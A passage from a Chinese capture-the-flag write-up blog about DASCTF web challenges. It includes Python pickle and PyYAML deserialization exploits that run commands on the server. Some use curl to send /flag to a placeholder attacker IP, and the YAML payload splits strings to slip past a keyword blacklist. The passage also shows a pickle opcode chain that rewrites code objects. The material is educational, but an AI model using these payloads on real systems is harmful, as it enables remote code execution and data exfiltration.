class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/hessian&quot;</span> &#125;<br>response = requests.get(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(response.text)<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getAllBooks&quot;</span><br>response = requests.get(url)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>emmmè¿™é‡Œä¸€å¼€å§‹æˆ‘ç”¨çš„nssçš„ç¯å¢ƒï¼Œä½†æ˜¯æ‰“è¿‡å»æ²¡ååº”ï¼Œæœ¬åœ°æµ‹è¯•æ˜¯å¯ä»¥çš„ï¼Œé‚£å°±æœ¬åœ°æ‰“æ‰“ç®—äº†ï¼Œæ”¾ä¸ªflagåœ¨æ ¹ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20250112180917440.png" alt="image-20250112180917440"></p><blockquote><p>è¿™é‡Œå¾—æ³¨æ„ä¸€ä¸‹å¾—è¯·æ±‚ä¸€ä¸ªæ¥å—å‚æ•°çš„è·¯ç”±æ‰ä¼šèµ°åˆ°hessianååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œæ¯•ç«Ÿæ–¹æ³•åå«changeBodyäº†ï¼Œæ¥æ”¶Bodyæ‰èƒ½changeğŸ¤”</p></blockquote><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/16878?time__1311=Gui=GK0Iq+ED/D0l7GkDujUrF3PNfAeD">https://xz.aliyun.com/t/16878?time__1311=Gui%3DGK0Iq%2BED%2FD0l7GkDujUrF3PNfAeD</a></p><p><a href="https://github.com/opensolon/solon/issues/145">https://github.com/opensolon/solon/issues/145</a></p><p><a href="https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/">https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17020853.html">https://www.cnblogs.com/kingbridge/articles/17020853.html</a></p>]]></content>
      
      
      <categories>
          
          <category> é¢˜ç›®å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF12æœˆæœ€åä¸€æˆ˜å¤ç°</title>
      <link href="/2024/12/25/DASCTF12%E6%9C%88%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/12/25/DASCTF12%E6%9C%88%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>2024å¹´æœ€åä¸€æ¬¡çš„dasï¼Œwebç»ˆäºä¹Ÿæ˜¯æ²¡æœ‰çˆ†é›¶äº†ï¼Œæœ€åä¸€é¢˜çš„1è§£é¢˜çœ‹äº†gxnå¤§å“¥çš„wpä¹Ÿæ˜¯å­¦åˆ°æ–°ä¸œè¥¿äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><p>å®˜æ–¹wpï¼š<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc">https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc</a></p><h1 id="const_python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h1><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        self.username = username<br>        self.password = password<br>        self.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„é»‘åå•æ²¡æœ‰è¿‡æ»¤importå’Œsubprocessï¼Œç›´æ¥å†™ä¸ªå¸¸è§„çš„reduceå‡½æ•°ç”¨curlå¤–å¸¦ä¸€ä¸‹flagå³å¯ï¼Œä¸€å¼€å§‹ç”¨opcodeä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸é€šï¼Œè¿™æ˜¯é˜Ÿå‹çš„exp</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        self.username = username<br>        self.password = password<br>        self.auth = auth<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        host = <span class="hljs-string">&#x27;&lt;ipåœ°å€&gt;&#x27;</span><br>        port = <span class="hljs-number">8888</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).run, ([<br>            <span class="hljs-string">&#x27;curl&#x27;</span>,<br>            <span class="hljs-string">&#x27;-d&#x27;</span>,<br>            <span class="hljs-string">&#x27;@/flag&#x27;</span>,<br>            <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/test&#x27;</span><br>        ],)<br><br>user = User(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>)<br>data = pickle.dumps(user)<br><span class="hljs-built_in">print</span>(data)<br>data = base64.b64encode(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241221184713683.png" alt="image-20241221184713683"></p><p><img src="https://cdn.clown2024.cn/image-20241221184804688.png" alt="image-20241221184804688"></p><h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>åæ¥çœ‹å®˜æ–¹wpï¼Œä¸Šé¢çš„è§£æ³•æ˜¯å‡ºé¢˜çš„æ—¶å€™æ²¡è¿‡æ»¤å¹²å‡€ï¼Œå¯¼è‡´éé¢„æœŸï¼Œå®˜æ–¹çš„æ˜¯ä¿®æ”¹å¸¸é‡å­—èŠ‚ç ï¼Œç¬¬ä¸€æ¬¡è§ï¼Œå­¦ä¹ ä¸€ä¸‹</p><p>æ€»ç»“ä¸€ä¸‹æ€è·¯ï¼Œå°±æ˜¯å…ˆå†™ä¸€ä¸ªè¯»æ–‡ä»¶çš„å‡½æ•°ï¼Œç„¶åè·å–ä»–çš„ä»£ç å¯¹è±¡ï¼Œç„¶åä¿®æ”¹ä»£ç å¯¹è±¡ä¸­çš„å¸¸é‡å±æ€§ï¼Œç”¨types.CodeTypeæ„å»ºæ–°çš„ä»£ç å¯¹è±¡ï¼Œç„¶åè°ƒç”¨æ–°çš„å‡½æ•°ï¼Œè¾¾åˆ°ä¿®æ”¹è¿”å›æ–‡ä»¶å†…å®¹çš„æ•ˆæœ</p><p>å¤§è‡´çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> types<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><span class="hljs-comment"># print(src.__code__.__dir__()) #æŸ¥çœ‹ä»£ç å¯¹è±¡æ‰€æœ‰å±æ€§</span><br><span class="hljs-comment"># print(src.__code__.co_consts)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> src.__code__.__dir__():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> : <span class="hljs-subst">&#123;<span class="hljs-built_in">getattr</span>(src.__code__, i)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># è·å–æ‰€æœ‰ä»£ç å¯¹è±¡çš„å±æ€§ï¼Œä¸€ä¸ªä¸ªèµ‹å€¼ç»™æ–°å¯¹è±¡ï¼Œåªæ”¹å˜å…¶ä¸­çš„å¸¸é‡</span><br>g1 = builtins.<span class="hljs-built_in">getattr</span><br>g2 = <span class="hljs-built_in">getattr</span>(src,<span class="hljs-string">&quot;__code__&quot;</span>)<br>g3 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_argcount&quot;</span>)<br>g4 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_posonlyargcount&quot;</span>)<br>g5 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_kwonlyargcount&quot;</span>)<br>g6 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_nlocals&quot;</span>)<br>g7 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_stacksize&quot;</span>)<br>g8 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_flags&quot;</span>)<br>g9 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_code&quot;</span>)<br>g10 = (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, (<span class="hljs-string">&#x27;encoding&#x27;</span>,)) <span class="hljs-comment">#g10 = getattr(g2,&quot;co_consts&quot;) # è®¾ç½®æ–°å¸¸é‡ï¼Œsrcçš„å¸¸é‡ä¸ºï¼š(None, &#x27;app.py&#x27;, &#x27;r&#x27;, &#x27;utf-8&#x27;, (&#x27;encoding&#x27;,))</span><br>g11 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_names&quot;</span>)<br>g12 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_varnames&quot;</span>)<br>g13 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_filename&quot;</span>)<br>g14 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_name&quot;</span>)<br>g15 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_firstlineno&quot;</span>)<br><span class="hljs-comment"># print(&quot;[*]========&quot;,type(g15))</span><br><span class="hljs-comment"># print(&quot;[*]========&quot;,g15)</span><br>g16 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_lnotab&quot;</span>)<br>g17 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_freevars&quot;</span>)<br>g18 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_cellvars&quot;</span>)<br><br>g19 = types.CodeType(g3,g4,g5,g6,g7,g8,g9,g10,g11,g12,g13,g14,g15,g16,g17,g18) <span class="hljs-comment"># ç”Ÿæˆæ–°ä»£ç å¯¹è±¡</span><br>g20 = builtins.<span class="hljs-built_in">setattr</span><br>g20(src,<span class="hljs-string">&quot;__code__&quot;</span>,g19)<br><span class="hljs-built_in">print</span>(src())<br><br><span class="hljs-comment"># ç„¶åå°±æ˜¯å°†ä¸Šé¢çš„ä»£ç æ”¹æˆopcodeå³å¯ï¼Œæ•´ä¸ªæ€è·¯å°±æ˜¯å…ˆå†™ä¸€ä¸ªè¯»æ–‡ä»¶çš„å‡½æ•°ï¼Œç„¶åä¿®æ”¹è¯¥å‡½æ•°ä»£ç å¯¹è±¡çš„å¸¸é‡ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ä»£ç å¯¹è±¡ï¼Œè®©å…¶è¯»flag</span><br></code></pre></td></tr></table></figure><p>ä½†ä¸Šé¢çš„å‚æ•°ä½ç½®å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œä¹Ÿè®¸æ˜¯æˆ‘çš„pythonç‰ˆæœ¬å’Œwpé‡Œçš„ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œå°±æ‡’å¾—è°ƒäº†ï¼Œå­¦ä¹ ä¸€ä¸‹æ€è·¯</p><p>ç„¶åå°±æ˜¯æ„å»ºopcode</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">op3 = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">src</span><br><span class="hljs-string">p3</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;__code__&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp6</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_kwonlyargcount&#x27;</span><br><span class="hljs-string">tRp7</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_nlocals&#x27;</span><br><span class="hljs-string">tRp8</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_stacksize&#x27;</span><br><span class="hljs-string">tRp9</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_flags&#x27;</span><br><span class="hljs-string">tRp10</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_code&#x27;</span><br><span class="hljs-string">tRp11</span><br><span class="hljs-string">(NS&#x27;/flag&#x27;</span><br><span class="hljs-string">S&#x27;r&#x27;</span><br><span class="hljs-string">S&#x27;utf-8&#x27;</span><br><span class="hljs-string">(S&#x27;encoding&#x27;</span><br><span class="hljs-string">ttp12</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_names&#x27;</span><br><span class="hljs-string">tRp13</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_varnames&#x27;</span><br><span class="hljs-string">tRp14</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_filename&#x27;</span><br><span class="hljs-string">tRp15</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_name&#x27;</span><br><span class="hljs-string">tRp16</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_firstlineno&#x27;</span><br><span class="hljs-string">tRp17</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_lnotab&#x27;</span><br><span class="hljs-string">tRp18</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_freevars&#x27;</span><br><span class="hljs-string">tRp19</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_cellvars&#x27;</span><br><span class="hljs-string">tRp20</span><br><span class="hljs-string">ctypes</span><br><span class="hljs-string">CodeType</span><br><span class="hljs-string">(g5</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">g7</span><br><span class="hljs-string">g8</span><br><span class="hljs-string">g9</span><br><span class="hljs-string">g10</span><br><span class="hljs-string">g11</span><br><span class="hljs-string">g12</span><br><span class="hljs-string">g13</span><br><span class="hljs-string">g14</span><br><span class="hljs-string">g15</span><br><span class="hljs-string">g16</span><br><span class="hljs-string">g17</span><br><span class="hljs-string">g18</span><br><span class="hljs-string">g19</span><br><span class="hljs-string">g20</span><br><span class="hljs-string">tRp21</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&quot;__code__&quot;</span><br><span class="hljs-string">g21</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è·å–<code>builtins</code>çš„getattræ–¹æ³•,é€šè¿‡getattrè·å–åˆ°srcçš„<code>__code__</code>,ç»§è€Œè·å¾—<code>co_const</code>ç­‰å‚æ•°,è·å–<code>builtins</code>çš„setattr,ä¿®æ”¹<code>__code__</code>ä¸ºæ–°çš„CodeTypeï¼ˆç€å®ä¸å¤ªä¼šå†™è¿™ä¹ˆé•¿çš„opcodeğŸ˜­ï¼‰</p><h1 id="yaml_matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h1><p>è¿™ä¸ªæ‰¾åˆ°æ–‡ç« ï¼Œæœ‰payloadæ˜¯æ²¡æœ‰è¿‡æ»¤çš„å¯ä»¥ç›´æ¥æ‰“ï¼š<a href="https://www.freebuf.com/vuls/256243.html,https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW=i=mER87o=oD">https://www.freebuf.com/vuls/256243.html,https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW%3Di%3DmER87o%3DoD</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#åˆ›å»ºäº†ä¸€ä¸ªç±»å‹ä¸ºzçš„æ–°å¯¹è±¡,è€Œå¯¹è±¡ä¸­extendå±æ€§åœ¨åˆ›å»ºæ—¶ä¼šè¢«è°ƒç”¨,å‚æ•°ä¸ºlistitemså†…çš„å‚æ•°<br>!!python/object/new:type<br>  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]<br>  listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨pythonçš„å¼•å·ç›´æ¥æ‹¼æ¥ï¼Œå†å¥—ä¸€å±‚execå³å¯</p><p>é‡Œé¢å‚æ•°æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆè¿™æ ·å½¢å¼æ‹¼æ¥å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">exec(\&quot;__import__(&#x27;o&#x27;&#x27;s&#x27;).sys\&quot;\&quot;tem(&#x27;ca&#x27;&#x27;lc&#x27;)\&quot;)<br></code></pre></td></tr></table></figure><p>ç„¶åä»–èƒ½å‡ºç½‘ï¼Œå¯ä»¥ç”¨æ‹¼æ¥ç»•è¿‡curlï¼Œæœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">!!python/object/new:type<br>  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]<br>  listitems: &quot;exec(\&quot;__import__(&#x27;o&#x27;&#x27;s&#x27;).sys\&quot;\&quot;tem(&#x27;cu&#x27;&#x27;rl http://&lt;ipåœ°å€&gt;:8888 -d `cat /flag`&#x27;)\&quot;)&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250209211435738.png" alt="image-20250209211435738"></p><h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•-1" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>è¿™é‡Œå­¦åˆ°å®˜æ–¹çš„ä¸€ä¸ªå›æ˜¾æŠ€å·§ï¼Œé€šè¿‡Serverè¯·æ±‚å¤´å¸¦å‡ºæ•°æ®</p><p>werkzeug.serving.WSGIRequestHandlerè¿™ä¸ªå¤„ç†å™¨æ˜¯ç”¨æ¥å¤„ç†è¯·æ±‚å¤´çš„</p><p>Serverå¤´çš„å€¼æ˜¯server_versionå±æ€§å’Œsys_versionå±æ€§æ‹¼æ¥åœ¨ä¸€èµ·çš„</p><p>é‚£æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹server_versionå±æ€§æˆ–è€…sys_versionå±æ€§å³å¯å¸¦å‡ºæ•°æ®äº†</p><p>ç”¨setattrå°±å¯ä»¥æ”¹äº†ï¼Œå®Œæ•´yamlå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>        args:<br>         - exp<br>         - !!python/<span class="hljs-built_in">tuple</span> []<br>         - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>        listitems: |<br>         bb=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br>         <span class="hljs-keyword">import</span> werkzeug<br>         <span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,bb )<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250209210050744.png" alt="image-20250209210050744"></p><h1 id="strange_php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h1><p>ä¸€ä¸ªphpå†™çš„ç•™è¨€æ¿åº”ç”¨ï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œä»£ç å®¡è®¡ï¼Œä½†æ˜¯å¾ˆå¤šåœ°æ–¹çš„åç¼€éƒ½æ˜¯å†™æ­»çš„ï¼Œåªæœ‰ä¸€ä¸ªåœ°æ–¹çš„æ–‡ä»¶è·¯å¾„æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„</p><p>å°±åœ¨welcome.phpçš„deleteæ¨¡å—çš„åœ°æ–¹</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PDO_connect.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;User.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span>  <span class="hljs-string">&#x27;UserMessage.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>   <span class="hljs-title function_ 